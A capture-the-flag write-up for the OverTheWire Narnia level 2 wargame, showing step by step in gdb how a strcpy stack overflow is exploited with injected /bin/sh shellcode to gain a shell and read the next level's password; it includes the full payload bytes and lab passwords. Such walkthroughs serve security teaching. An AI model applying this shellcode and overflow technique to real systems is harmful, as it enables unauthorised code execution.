@@ -1,0 +1,153 @@
+This is a solution guide to the Narnia2 Level at 
+http://overthewire.org/wargames/narnia/
+
+This write-up was created on 28 February 2015.
+
+First connect to the lab
+-> ssh narnia2@narnia.labs.overthewire.org
+-> Enter the following as the password nairiepecu
+
+Change directories to the narnia games folder
+-> cd /narnia
+
+First let's examine how we get the password for the next level.
+
+-> less narnia2.c
+
+int main(int argc, char * argv[]){
+        char buf[128];
+
+        if(argc == 1){
+                printf("Usage: %s argument\n", argv[0]);
+                exit(1);
+        }
+        strcpy(buf,argv[1]);
+        printf("%s", buf);
+
+        return 0;
+}
+
+This challenge appears to revolve around a simple buffer overflow. Notice that
+the strcpy will take whatever argument is in argv and copy it to the buffer. Also
+that there is no bounds checking - as a result it is possible to overwrite the 
+return address following printf.
+
+First, let's figure out how large the buffer is that we need to overflow. We know
+buf is 128 bytes, so let's setup that first.
+
+|----------------|
+|    buf is      |
+|    128 bytes   |
+|----------------|
+|    12 bytes    |
+|   of garbage   |
+|----------------|
+|    return 0    |
+|----------------|
+
+So lets test it out, but first lets find a good breakpoint in gdb:
+narnia2@melinda:/narnia$ gdb ./narnia2
+(gdb) disass main
+   0x080484b0 <+83>:	movl   $0x8048574,(%esp)
+   0x080484b7 <+90>:	call   0x8048310 <printf@plt>
+   0x080484bc <+95>:	mov    $0x0,%eax
+   0x080484c1 <+100>:	leave  
+   0x080484c2 <+101>:	ret    
+End of assembler dump.
+
+Since we are attempting to target the last ret, lets set a breakpoint 
+at the leave instruction.
+(gdb) break *0x080484c1
+
+Now we are ready to experiment! Now run a string that is a total of 140 bytes.
+(gdb) run `perl -e 'print "A"x140'`
+Starting program: /games/narnia/narnia2 `perl -e 'print "A"x140'`
+Breakpoint 1, 0x080484c1 in main ()
+(gdb) c
+Continuing.
+Program received signal SIGSEGV, Segmentation fault.
+0xf7e3ba00 in __libc_start_main () from /lib32/libc.so.6
+
+Okay, now that we know we crash let's verify that we can take control of the program.
+We can test this by adding 4 known bytes to see if we crash at the address we have 
+chosen.
+(gdb) run `perl -e 'print "A"x140 . "\xef\xbe\xad\xde"'`
+Starting program: /games/narnia/narnia2 `perl -e 'print "A"x140 . "\xef\xbe\xad\xde"'`
+Breakpoint 1, 0x080484c1 in main ()
+(gdb) c
+Continuing.
+Program received signal SIGSEGV, Segmentation fault.
+0xdeadbeef in ?? ()
+
+Now we know we can take control of the program! so now we have to pick a good address
+that we want to return to. A good way to do this is to examine esp and subtract our
+buffer length so see where our shellcode can start.
+(gdb) x/40xw $esp-144
+0xffffd5c0:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffd5d0:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffd5e0:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffd5f0:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffd600:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffd610:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffd620:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffd630:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffd640:	0x41414141	0x41414141	0x41414141	0xdeadbeef
+0xffffd650:	0x00000000	0xffffd6e4	0xffffd6f0	0xf7feacea
+
+So now we know the earliest starting address is 0xffffd5c0. Next we should craft our exploit.
+The first step is to grab some shellcode from http://shell-storm.org/shellcode/files/shellcode-811.php
+Next, let's craft our exploit together with the shellcode
+`perl -e 'print "A"x56 . "\x31\xc0\x50\x68\x2f\x2f\x73" . "\x68\x68\x2f\x62\x69\x6e\x89" .  
+"\xe3\x89\xc1\x89\xc2\xb0\x0b" . "\xcd\x80\x31\xc0\x40\xcd\x80" . "B"x56 . "\xec\xd5\xff\xff"'`
+
+Notice that I have added some padding, this is mainly to help my exploit so that I don't have to be
+as precise and it also helps since the environment variables change when I exit the debugger. Now, we
+can try out exploit, but first let's see what it looks like in the stack so that we can compare against
+our previous test.
+
+(gdb) run `perl -e 'print "A"x56 . "\x31\xc0\x50\x68\x2f\x2f\x73" . "\x68\x68\x2f\x62\x69\x6e\x89" .  
+"\xe3\x89\xc1\x89\xc2\xb0\x0b" . "\xcd\x80\x31\xc0\x40\xcd\x80" . "B"x56 . "\xef\xbe\xad\xde"'`
+Starting program: /games/narnia/narnia2 `perl -e 'print "A"x56 . "\x31\xc0\x50\x68\x2f\x2f\x73" . 
+"\x68\x68\x2f\x62\x69\x6e\x89" .  "\xe3\x89\xc1\x89\xc2\xb0\x0b" . "\xcd\x80\x31\xc0\x40\xcd\x80" . 
+"B"x56 . "\xef\xbe\xad\xde"'`
+Breakpoint 1, 0x080484c1 in main ()
+(gdb) c
+Continuing.
+Program received signal SIGSEGV, Segmentation fault.
+0xdeadbeef in ?? ()
+(gdb) x/40xw $esp-144
+0xffffd5c0:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffd5d0:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffd5e0:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffd5f0:	0x41414141	0x41414141	0x6850c031	0x68732f2f
+0xffffd600:	0x69622f68	0x89e3896e	0xb0c289c1	0x3180cd0b
+0xffffd610:	0x80cd40c0	0x42424242	0x42424242	0x42424242
+0xffffd620:	0x42424242	0x42424242	0x42424242	0x42424242
+0xffffd630:	0x42424242	0x42424242	0x42424242	0x42424242
+0xffffd640:	0x42424242	0x42424242	0x42424242	0xdeadbeef
+0xffffd650:	0x00000000	0xffffd6e4	0xffffd6f0	0xf7feacea
+
+Notice that we now have shellcode that is interwoven between our "A"s and "B"s to assist 
+with accounting for changes once we leave the debugger. So now we can pick a return address
+somewhere inside the "A"s. I am going to select an address in the middle, 0xffffd5e0.
+(gdb) run `perl -e 'print "A"x56 . "\x31\xc0\x50\x68\x2f\x2f\x73" . "\x68\x68\x2f\x62\x69\x6e\x89" .  
+"\xe3\x89\xc1\x89\xc2\xb0\x0b" . "\xcd\x80\x31\xc0\x40\xcd\x80" . "B"x56 . "\xe0\xd5\xff\xff"'`
+Starting program: /games/narnia/narnia2 `perl -e 'print "A"x56 . "\x31\xc0\x50\x68\x2f\x2f\x73" . 
+"\x68\x68\x2f\x62\x69\x6e\x89" .  "\xe3\x89\xc1\x89\xc2\xb0\x0b" . "\xcd\x80\x31\xc0\x40\xcd\x80" . 
+"B"x56 . "\xe0\xd5\xff\xff"'`
+process 23943 is executing new program: /bin/dash
+$ 
+
+Great it worked! Now, let's try it outside the debugger.
+narnia2@melinda:/narnia$ ./narnia2 `perl -e 'print "A"x56 . "\x31\xc0\x50\x68\x2f\x2f\x73" . \
+"\x68\x68\x2f\x62\x69\x6e\x89" .  "\xe3\x89\xc1\x89\xc2\xb0\x0b" . "\xcd\x80\x31\xc0\x40\xcd\x80" . \
+"B"x56 . "\xe0\xd5\xff\xff"'`
+$ whoami
+narnia3
+$ cat /etc/narnia_pass/narnia3
+vaequeezee
+$ 
+
+
+BINGO, it worked and we didn't even have to worry about our address because of the padding! 
+Level 3 password is vaequeezee
